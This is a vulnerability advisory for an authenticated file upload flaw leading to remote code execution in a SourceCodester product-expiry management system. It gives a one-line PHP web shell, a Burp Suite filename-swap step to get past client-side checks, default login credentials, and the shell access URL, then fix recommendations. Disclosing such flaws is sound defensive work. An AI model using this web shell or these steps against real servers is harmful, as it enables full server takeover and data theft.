# Remote Code Execution (RCE) via Logic Flaw and Insecure File Upload

## 🛡️ Vulnerability Information
- **Vulnerability Type**: Remote Code Execution (RCE) via Arbitrary File Upload
- **Affected Component**: `add-product.php`
- **Software**: Product Expiry Alert Management System v1.0
- **Vendor**: SourceCodester (Author: newleastpaysolution)
- **Privileges Required**: Low (Authenticated)
- **CVSS Score**: 8.8 (High) / 9.8 (Critical if pre-auth)

## 📝 Description
The "Product Expiry Alert Management System" contains a critical security flaw in its `add-product.php` component. The application fails to validate file extensions on the server side, allowing attackers to upload malicious PHP scripts. 

A significant logic flaw was also identified: the application calls `move_uploaded_file()` **before** performing database integrity checks. This ensures that even if the form submission is rejected by the database (e.g., "Product Already Exist"), the uploaded web shell is still successfully persisted on the server.

---

## 🛠️ Proof of Concept (PoC)

### 1. Vulnerable Code Audit
The server-side script `add-product.php` uses the original user-supplied filename without any filtering or extension verification.
<img width="2067" height="679" alt="51a5dddcda788acda9505dd2b467d5c0" src="https://github.com/user-attachments/assets/3846df90-7b26-44d8-8a8c-c90fae1e69a2" />


### 2. Bypassing Client-side Validation
The application uses client-side JavaScript to restrict file types. By renaming the payload to `cmd.jpg` and using Burp Suite to intercept the request, an attacker can modify the filename back to `cmd.php` during transit.
<img width="1781" height="387" alt="7651e2bb02a6b162a7918525ca6bf279" src="https://github.com/user-attachments/assets/4eb5479c-089b-4d40-b632-df01f565c7e3" />

### 3. Exploiting Logic Flaw (File Persistence)
Even when the system returns an "Error: product Already Exist" message, the file is already stored in the `/uploadImage/` directory because the file-saving logic precedes the database validation.
<img width="1319" height="538" alt="ad14510ec33a2512f7f334a30fa092e6" src="https://github.com/user-attachments/assets/909ec654-d304-43ce-aee7-b3eeb62402a4" />

### 4. Remote Code Execution (RCE)
Once uploaded, the script can be accessed directly to execute arbitrary system commands.
<img width="978" height="254" alt="5ac12f8d74c7cc38b3d3857db070dc55" src="https://github.com/user-attachments/assets/1ae6bc25-171e-43e8-a044-09516af1d57f" />

---

## 📋 Reproduction Steps
1. Log in to the dashboard (Default: `newleastpaysolution@gmail.com` / `escobar2012`).
2. Navigate to the **"Add Product"** page.
3. Prepare a PHP payload: `<?php system($_GET['c']); ?>` and name it `cmd.jpg`.
4. Upload the file and intercept the request with **Burp Suite**.
5. Change the filename from `cmd.jpg` to `cmd.php` and forward the request.
6. Access the shell at: `http://localhost/[path]/uploadImage/cmd.php?c=whoami`.

## 💥 Impact
Attackers can gain full control over the web server, leading to data breaches, unauthorized modifications, and further lateral movement within the network.

## 🚀 Recommendation
- Use a server-side whitelist to validate file extensions (e.g., `pathinfo()`).
- Implement file renaming using a random hash (e.g., `md5(time())`).
- Validate database records **before** calling the `move_uploaded_file()` function.
